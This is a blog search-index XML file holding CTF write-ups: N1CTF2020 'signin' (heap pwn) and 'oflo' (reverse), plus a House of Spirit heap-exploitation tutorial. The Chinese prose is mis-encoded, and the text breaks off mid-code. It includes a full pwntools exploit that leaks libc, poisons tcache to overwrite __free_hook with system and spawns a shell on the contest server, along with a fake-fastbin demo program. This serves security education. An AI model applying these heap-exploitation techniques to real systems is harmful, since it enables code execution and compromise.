<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>N1CTF2020éƒ¨åˆ†wp</title>
    <link href="/2020/10/19/N1CTF2020%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/10/19/N1CTF2020%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="N1CTF2020éƒ¨åˆ†wp"><a href="#N1CTF2020éƒ¨åˆ†wp" class="headerlink" title="N1CTF2020éƒ¨åˆ†wp"></a>N1CTF2020éƒ¨åˆ†wp</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>è°ƒè¯•one gadget èŠ±äº†è¿‘4å°æ—¶ã€‚ã€‚ğŸ˜­</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>c++å†™çš„ç¨‹åºï¼Œå­˜åœ¨add show delçš„åŠŸèƒ½ï¼Œä½†æ˜¯è¿›å…¥å„è‡ªçš„å‡½æ•°çœ‹ï¼Œçœ‹çš„æ˜¯ç¨€é‡Œç³Šæ¶‚çš„ã€‚ä¸ªäººå‘ç°çš„åªæ˜¯å…¶æŒ‰ç…§è‡ªå·±çš„é€»è¾‘å¯¹å†…å­˜å—idx 1ï¼Œ2è¿›è¡Œå¤„ç†ã€‚</p><p>å› ä¸ºåŠŸèƒ½å¾ˆç®€å•ï¼Œå¯ä»¥ç›´æ¥ä¸Šæ‰‹è°ƒè¯•ï¼Œæ¥ç¡®å®šç¨‹åºæ˜¯å¦‚ä½•è¿ä½œçš„ã€‚</p><p>ä¸Šæ‰‹è°ƒè¯•åä¼šå‘ç°ï¼Œå…¶æ ¹æ®3ä¸ªæŒ‡é’ˆæ¥å¯¹idx 1ã€2 å¤„ç†ã€‚</p><h4 id="åŠ¨è°ƒåˆ†æ"><a href="#åŠ¨è°ƒåˆ†æ" class="headerlink" title="åŠ¨è°ƒåˆ†æ"></a>åŠ¨è°ƒåˆ†æ</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ber'</span>,str(data))</code></pre></div><div class="hljs"><pre><code class="hljs python">add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div><p>çœ‹ä¸‹bssæ®µ0x2032a0çš„æ•°æ®ï¼š</p><div class="hljs"><pre><code class="hljs python">pwndbg&gt;  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0002032A0</span> +<span class="hljs-number">0x555555554000</span><span class="hljs-number">0x5555557572a0</span>: <span class="hljs-number">0x0000555555769e70</span>      <span class="hljs-number">0x0000555555769e78</span><span class="hljs-number">0x5555557572b0</span>: <span class="hljs-number">0x0000555555769e78</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/O7QsvP.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs python">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555769e60</span><span class="hljs-number">0x555555769e60</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e70</span>: <span class="hljs-number">0x0000000000000001</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555769e80</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000000000f181</span></code></pre></div><p>å†æ¬¡ï¼š</p><div class="hljs"><pre><code class="hljs python">add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div><p>çœ‹ä¸‹bssæ®µ0x2032a0çš„æ•°æ®ï¼š</p><div class="hljs"><pre><code class="hljs python">pwndbg&gt;  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0002032A0</span> +<span class="hljs-number">0x555555554000</span><span class="hljs-number">0x5555557572a0</span>: <span class="hljs-number">0x0000555555769e90</span>      <span class="hljs-number">0x0000555555769ea0</span><span class="hljs-number">0x5555557572b0</span>: <span class="hljs-number">0x0000555555769ea0</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><div class="hljs"><pre><code class="hljs python">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555769e60</span><span class="hljs-number">0x555555769e60</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e70</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555769e80</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x555555769e90</span>: <span class="hljs-number">0x0000000000000001</span>      <span class="hljs-number">0x0000000000000002</span><span class="hljs-number">0x555555769ea0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000000000f161</span></code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/t6qFSC.png" srcset="/img/loading.gif" alt></p><p>å¯ä»¥è¿™æ ·æ¥ç€æµ‹è¯•free å’Œ delçš„åŠŸèƒ½ã€‚</p><h4 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h4><p>é‡ç‚¹å°±æ˜¯bssæ®µå‚¨å­˜å†…å­˜å— 1 2 ä¿¡æ¯çš„3ä¸ªæŒ‡é’ˆã€‚</p><h5 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h5><ul><li><p>æŒ‡é’ˆ1å’Œ3æ˜¯ä¸€ä¸ªè¾¹ç•ŒæŒ‡é’ˆï¼ŒæŒ‡é’ˆ2æ˜¯æ•°æ®ç¼–è¾‘æŒ‡é’ˆã€‚æ ¹æ®æŒ‡é’ˆ2å¤„æ¥å†™numberæ•°æ®ï¼Œä¸€æ¬¡æ˜¯8ä¸ªå­—èŠ‚ï¼Œå†™å®Œåï¼ŒæŒ‡é’ˆ2ä¼šåŠ 8ã€‚</p></li><li><p>å½“æŒ‡é’ˆ2å¤§å°è¶…è¿‡æŒ‡é’ˆ3ï¼Œå…¶å°±ä¼šç”³è¯·ä¸€å—æ–°çš„å†…å­˜ï¼Œå…¶ç”³è¯·å®Œå†…å­˜å¤§å°æ˜¯ä»¥<code>0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010</code> è¿™æ ·é€’å¢ã€‚</p></li><li><p>ç”³è¯·å®Œæ–°å†…å­˜ï¼Œä¼šæŠŠæŒ‡é’ˆ1å¯¹åº”çš„å†…å­˜å—è¿›è¡Œfreeï¼Œä¹Ÿå°±æ˜¯ä¸Šä¸€å—chunkã€‚å¹¶æŠŠä¸Šä¸€å—å†…å­˜ä¸­çš„numberå€¼è¿›è¡Œæ‹·è´åˆ°æ–°ç”³è¯·çš„å†…å­˜ä¸­ã€‚å¹¶ä¸”ä¼šæ ¹æ®ç”³è¯·åˆ°çš„chunkåœ°å€ï¼Œè¿›è¡Œå¯¹bssæ®µ3ä¸ªæŒ‡é’ˆçš„æ›´æ–°ã€‚</p><h5 id="freeå‡½æ•°"><a href="#freeå‡½æ•°" class="headerlink" title="freeå‡½æ•°"></a>freeå‡½æ•°</h5></li><li><p>è®©æŒ‡é’ˆ2å‡8.</p><h5 id="show-å‡½æ•°"><a href="#show-å‡½æ•°" class="headerlink" title="show å‡½æ•°"></a>show å‡½æ•°</h5></li><li><p>æ‰“å°å‡ºæŒ‡é’ˆ2å‡8åå¯¹åº”åœ°å€ä¸Šçš„æ•°æ®ä¿¡æ¯</p></li></ul><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><h4 id="idx-å†…å­˜å—1"><a href="#idx-å†…å­˜å—1" class="headerlink" title="idx å†…å­˜å—1"></a>idx å†…å­˜å—1</h4><ul><li><p>addåˆ°æœ‰0x1010 chunkå—ï¼Œå…¶åŸæ¥çš„0x810ä¼šæ”¾è¿›unsortbin</p></li><li><p>free å¤šæ¬¡ï¼Œè®©æŒ‡é’ˆ2 æŒ‡å‘0x810çš„fdæˆ–è€…bkå¤„ï¼Œåˆ©ç”¨showæ³„æ¼å‡ºlibcåœ°å€</p></li><li><p>free å¤šæ¬¡ï¼Œè®©æŒ‡é’ˆ2æŒ‡å‘0x20çš„fdå¤„ï¼Œè¿›è¡Œtcache attackï¼Œä¿®æ”¹å…¶ä¸ºfree hook</p><h4 id="idx-å†…å­˜å—2"><a href="#idx-å†…å­˜å—2" class="headerlink" title="idx å†…å­˜å—2"></a>idx å†…å­˜å—2</h4></li><li><p>addæ•°æ®ï¼Œå‡†å¤‡ä¸Šfree hookï¼Œä¸Šfree hook æ”¹free hookä¸ºone gadget</p></li><li><p>ç´§æ¥ç€ç¨‹åºï¼Œå°±free ä¸Šä¸€ä¸ªchunkï¼Œå°±ä¼šè§¦å‘free hook</p></li></ul><p>ä½†æ˜¯å†™å®Œexpï¼Œä¼šå‘ç°one gadgetæ²¡æœ‰ä¸€ä¸ªå¯ä»¥æ‰“é€šçš„ï¼Œæ ˆä¸Šå­˜åœ¨å¾ˆå¤šæ•°æ®ï¼Œæ— æ³•æ»¡è¶³ã€‚å°½ç®¡ä½¿ç”¨reallocè¿›è¡Œæ ˆå¸§è°ƒæ•´ï¼Œä¹Ÿæ²¡æ³•å­ã€‚</p><p>æ­¤æ—¶çœ‹ä¸€ä¸‹å¯„å­˜å™¨ä¸Šçš„ä¿¡æ¯ï¼Œå‘ç°åˆšé€šè¿‡free hookè·³è½¬è¿‡å»åï¼Œä¸Šé¢çš„rdi rsiä»€ä¹ˆçš„éƒ½æŒ‡å‘äº†å¯æ§çš„heapæ®µï¼Œé‚£å°±ä¿®æ”¹æ€è·¯ï¼Œä¿®æ”¹free hook ä¸ºsystemï¼Œ<strong>å¹¶ä¸”æå‰ä¿®æ”¹å…¶rdiæŒ‡å‘heapæ®µçš„æ•°æ®ï¼Œä¿®æ”¹ä¸º<code>sh\x00</code></strong> ã€‚è¿™æ ·å†è§¦å‘free hookå°±å¯ä»¥<code>system(sh)</code>äº†ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/WPo0kI.png" srcset="/img/loading.gif" alt></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./signin'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'47.242.161.199'</span>,<span class="hljs-number">9990</span>)    libc = elf.libc    <span class="hljs-comment"># libc = ELF('./libc.so')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]roc = [<span class="hljs-number">0</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x9</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ber'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">258</span>):    add(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">458</span>+<span class="hljs-number">57</span>):    free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)r()libc_base = int(r(<span class="hljs-number">15</span>),<span class="hljs-number">10</span>) - <span class="hljs-number">0x3ebca0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">270</span>):    free(<span class="hljs-number">1</span>)info_addr(<span class="hljs-string">'libcbase'</span>,libc_base)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_baseadd(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>)add(<span class="hljs-number">1</span>,free_hook<span class="hljs-number">-8</span>)system = libc.sym[<span class="hljs-string">'system'</span>] +libc_baseadd(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">26739</span>)add(<span class="hljs-number">2</span>,system)add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="oflo"><a href="#oflo" class="headerlink" title="oflo"></a>oflo</h2><p>å­˜åœ¨èŠ±æŒ‡ä»¤ï¼Œæ— æ³•æ­£å¸¸åç¼–è¯‘ï¼Œç›´æ¥å¯ä»¥ç”¨idaæˆ–è€…gdbè¿›è¡Œè·Ÿå³å¯ã€‚ä½†æ˜¯ä¸èƒ½ç›´æ¥æ‰“å¼€ï¼Œä¼šè¢«åè°ƒè¯•ptraceæ£€æµ‹åˆ°ï¼Œå¯ä»¥attachä¸Šå»å³å¯ã€‚<strong>ï¼ˆæ³¨æ„æ˜¯rootæƒé™ä¸‹ã€‚ï¼‰</strong></p><p>å¼€å§‹ç¨‹åºè®©è¾“å…¥19ä¸ªå­—ç¬¦ï¼Œå…³é”®ä»£ç åœ¨<code>0x400a69</code>,ä½†æ˜¯åçš„æœºå™¨ç ï¼Œgdb ä¸‹watchä¸€ä¸‹ï¼Œå‘ç°æœ‰æµç¨‹åœ¨æ ¹æ®ä½ <strong>è¾“å…¥çš„ä¸œè¥¿</strong>å¤„ç†è¿™ä¸€å—çš„æœºå™¨ç ï¼Œè¾“å…¥æ­£ç¡®äº†å¯ä»¥æ‰§è¡Œä¸‹å»ã€‚åœ¨å…³é”®ä»£ç å¤„ï¼Œå¯ä»¥å‘ç°å…¶æ˜¯åœ¨å¤„ç†14ä½çš„æ•°æ®ï¼Œä½†æ˜¯åˆšå¼€å§‹è¾“å…¥çš„æ˜¯19ä¸ªï¼Œå¤šå‡ºæ¥çš„5ä¸ªä¸çŸ¥é“ä»€ä¹ˆç”¨ã€‚è°ƒè¯•ä¼šå‘ç°ï¼Œå…¶å°±æ ¹æ®å‰5ä¸ªå­—èŠ‚ï¼Œå¯¹<code>0x400a69</code>å—è¿›è¡Œå¤„ç†ï¼Œä¸€å…±å¤„ç†äº†10æ¬¡ã€‚å¯ä»¥çŒœåˆ°å°±æ˜¯<code>n1ctf</code>ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/IBvReP.png" srcset="/img/loading.gif" alt></p><p>è¿™å—å¤„ç†å®Œå…¶æ±‡ç¼–ä»£ç ï¼Œå°±æ­£å¸¸äº†ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i ) &#123;   <span class="hljs-keyword">if</span> ( *(&amp;v4 + i) != ((*(<span class="hljs-keyword">char</span> *)(i + a1) + <span class="hljs-number">2</span>) ^ *(<span class="hljs-keyword">char</span> *)(i + a2)) )</code></pre></div><p>è¿›å…¥ä»¥åå¯ä»¥çœ‹åˆ°å…³é”®ä»£ç ã€‚å…¶æ˜¯åœ¨äºèµ·åˆç¨‹åºï¼Œ<code>cat /proc/version</code>åˆ°çš„å­—ç¬¦ä¸²å–å‰14ä¸ªåœ¨è¿›è¡Œxorã€‚è¦æ˜¯ç»•è¿‡è¿™é‡Œï¼Œæ²¡æœ‰ç›¸åº”å­—ç¬¦ä¸²ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">key = [<span class="hljs-number">0x35</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x11</span>, <span class="hljs-number">0x1A</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x11</span>, <span class="hljs-number">0x14</span>,<span class="hljs-number">0x2B</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x3D</span>,<span class="hljs-number">0x3C</span>,<span class="hljs-number">0x5F</span>]data = [<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    flag += chr(key[i] ^ (data[i]+<span class="hljs-number">2</span>))print(flag)</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Spirit</title>
    <link href="/2020/10/09/House%20of%20Spirit/"/>
    <url>/2020/10/09/House%20of%20Spirit/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>House of Spiritï¼ˆä¸‹é¢ç§°ä¸ºhosï¼‰æ˜¯ä¸€ä¸ªç»„åˆå‹æ¼æ´çš„åˆ©ç”¨ï¼Œæ˜¯å˜é‡è¦†ç›–å’Œå †ç®¡ç†æœºåˆ¶çš„ç»„åˆåˆ©ç”¨ï¼Œ<strong>å…³é”®åœ¨äºèƒ½å¤Ÿè¦†ç›–ä¸€ä¸ªå †æŒ‡é’ˆå˜é‡ï¼Œä½¿å…¶æŒ‡å‘å¯æ§çš„åŒºåŸŸ</strong>ï¼Œåªè¦æ„é€ å¥½æ•°æ®ï¼Œé‡Šæ”¾åç³»ç»Ÿä¼šé”™è¯¯çš„å°†è¯¥åŒºåŸŸä½œä¸ºå †å—æ”¾åˆ°ç›¸åº”çš„fastbiné‡Œé¢ï¼Œæœ€åå†åˆ†é…å‡ºæ¥çš„æ—¶å€™ï¼Œå°±æœ‰å¯èƒ½æ”¹å†™æˆ‘ä»¬ç›®æ ‡åŒºåŸŸï¼ˆå¤šä¸ºå‡½æ•°æŒ‡é’ˆå’Œ<strong>è¿”å›åœ°å€</strong>ï¼‰ã€‚</p><h2 id="æ ¸å¿ƒæ¡ä»¶"><a href="#æ ¸å¿ƒæ¡ä»¶" class="headerlink" title="æ ¸å¿ƒæ¡ä»¶"></a>æ ¸å¿ƒæ¡ä»¶</h2><ul><li>æœ‰æœºä¼šè¦†ç›–ä¸€ä¸ªå †æŒ‡é’ˆå˜é‡ï¼Œä½¿å…¶æŒ‡å‘ç›®æ ‡å¯æ§çš„åŒºåŸŸ</li><li>èƒ½å¤Ÿåœ¨ç›®æ ‡å¯æ§ä½ç½®å¤„ä¼ªé€  fastbin chunk</li></ul><p>è¿™æ ·å°†å…¶è¿™ä¸ªå †æŒ‡é’ˆé‡Šæ”¾ï¼Œä¼šæ”¾åˆ°ç›¸åº”çš„fastbinï¼Œä»è€Œè¾¾åˆ°åˆ†é…æŒ‡å®šåœ°å€çš„ chunk çš„ç›®çš„ã€‚</p><h3 id="fastbin-fake-chunk-éœ€è¦ç»•è¿‡çš„æ£€æµ‹"><a href="#fastbin-fake-chunk-éœ€è¦ç»•è¿‡çš„æ£€æµ‹" class="headerlink" title="fastbin fake chunk éœ€è¦ç»•è¿‡çš„æ£€æµ‹"></a>fastbin fake chunk éœ€è¦ç»•è¿‡çš„æ£€æµ‹</h3><ul><li>fake chunk çš„ ISMMAP ä½ä¸èƒ½ä¸º 1ï¼Œå› ä¸º free æ—¶ï¼Œå¦‚æœæ˜¯ mmap çš„ chunkï¼Œä¼šå•ç‹¬å¤„ç†ã€‚</li><li>fake chunk åœ°å€éœ€è¦å¯¹é½ï¼Œ <code>MALLOC_ALIGN_MASK</code></li><li>fake chunk çš„ size å¤§å°éœ€è¦æ»¡è¶³å¯¹åº”çš„ fastbin çš„éœ€æ±‚ï¼ŒåŒæ—¶ä¹Ÿå¾—å¯¹é½ã€‚</li><li>fake chunk çš„ <strong>next chunk</strong> çš„å¤§å°ä¸èƒ½å°äº <code>2 * SIZE_SZ</code>ï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äº<code>av-&gt;system_mem</code> ã€‚(è¿™ä¸ªå¤§å°è¿˜æ˜¯å¾ˆéšæ„çš„ï¼Œä¸å¿…è¦éå¾—æ˜¯fastbin çš„size ä¾‹å¦‚ :0x1234)</li><li>fake chunk å¯¹åº”çš„ fastbin é“¾è¡¨å¤´éƒ¨ä¸èƒ½æ˜¯è¯¥ fake chunkï¼Œå³ä¸èƒ½æ„æˆ double free çš„æƒ…å†µã€‚</li></ul><h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This file demonstrates the house of spirit attack.n"</span>);  <span class="hljs-comment">//è°ƒç”¨ä¸€æ¬¡mallocæ¥åˆå§‹åŒ–å †  </span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Calling malloc() once so that it sets up its memory.n"</span>);    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">//ç°åœ¨æˆ‘ä»¬å°†è¦†å†™ä¸€ä¸ªæŒ‡é’ˆæ¥æŒ‡å‘ä¸€ä¸ªä¼ªé€ çš„fastbinåŸŸ</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"We will now overwrite a pointer to point to a fake 'fastbin' region.n"</span>);    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *a;  <span class="hljs-comment">//è¿™ä¸ªå’ŒfastbinYæ— å…³,ä¸è¦è¢«è¿™ä¸ª10æ‰€éª—,fake_chunksåªæ˜¯ä¸€å—å†…å­˜</span>    <span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));  <span class="hljs-comment">//è¿™ä¸ªåŸŸåŒ…å«äº†ä¸¤ä¸ªchunk,ç¬¬ä¸€ä¸ªä»fake_chunks[1]å¼€å§‹,å¦ä¸€ä¸ªä»fake_chunks[9]å¼€å§‹</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n"</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);  <span class="hljs-comment">//è¿™ä¸ªchunkçš„sizeå¿…é¡»ç¬¦å’Œfastbinçš„è¦æ±‚(&lt;=128 x64ä½ç³»ç»Ÿ),PREV_INUSEä½åœ¨fasybin-sized chunksä¸­ä¹Ÿæ˜¯è¢«å¿½ç•¥çš„,ä½†æ˜¯IS_MAPPEDå’ŒNON_MAIN_ARENä¼šå¼•å‘ä¸€äº›é—®é¢˜</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n"</span>);    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n"</span>);    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span>  <span class="hljs-comment">//ä¸‹ä¸€ä¸ªfake chunkçš„sizeå¿…é¡»æ˜¯åˆæ³•çš„ã€‚ å³&gt; 2 * SIZE_SZï¼ˆåœ¨x64ä¸Šéœ€è¦&gt; 16ï¼‰å’Œï¼†&lt;av-&gt; system_memï¼ˆå¯¹äºmain arenaæ¥è¯´ï¼Œé»˜è®¤ä¸º&lt;128kbï¼‰å¹¶ä¸”å¯ä»¥é€šè¿‡nextsizeå®Œæ•´æ€§æ£€æŸ¥ã€‚ ä½†æ˜¯æˆ‘ä»¬æ— éœ€ç¬¦å’ŒFastbinçš„å¤§å°</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n"</span>);        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>    fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span>  <span class="hljs-comment">//ç°åœ¨æˆ‘ä»¬å°†é€šè¿‡æœ‰ç€fake first chunksçš„fakeåŒºåŸŸåœ°å€æ¥è¦†å†™æˆ‘ä»¬çš„æŒ‡é’ˆ</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n"</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//è¦æ³¨æ„çš„æ˜¯,chunkå¿…é¡»æ˜¯16å­—èŠ‚å¯¹é½çš„</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n"</span>);    a = &amp;fake_chunks[<span class="hljs-number">2</span>];    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Freeing the overwritten pointer.n"</span>);    <span class="hljs-built_in">free</span>(a);  <span 